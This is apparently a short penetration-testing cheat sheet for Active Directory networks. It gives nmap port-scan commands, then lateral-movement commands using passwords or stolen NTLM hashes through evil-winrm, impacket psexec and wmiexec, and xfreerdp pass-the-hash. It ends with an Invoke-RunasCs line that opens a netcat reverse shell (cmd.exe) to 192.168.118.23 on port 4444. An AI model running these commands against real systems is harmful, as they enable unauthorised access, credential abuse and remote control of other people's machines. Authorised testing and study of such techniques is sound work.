#### Port Scanning

```
#Good for active directory machines.
nmap -F -T4 -Pn <ip> 
nmap -Pn -iL <hosts> -p22,3389,5895,47001,88,389,445,80,443,21,8000,8080,8443,1433,3306,53,135,139 -oA internal_scan
```


```
#EVIL-WINRM
evil-winrm -u <user> -H <hash> -i <ip>
evil-winrm -u <user> -p <pass> -i <ip>

#SMB
impacket-psexec <domain>/<user>@<target-ip> -dc-ip <ip> -hashes
impacket-wmiexec <domain>/<user>@<target-ip> -hashes

#RDP
xfreerdp /v:<ip> /u:<user> /pth:<hash> /d:<domain>
xfreerdp /v:<ip> /u:<user> /p:<pass> /d:<domain>

#Invoke RunAS
import-module .\Invoke-RunasCs.ps1
Invoke-RunasCs <username> <password> 'c:\tmp\nc.exe 192.168.118.23 4444 -e cmd.exe'
```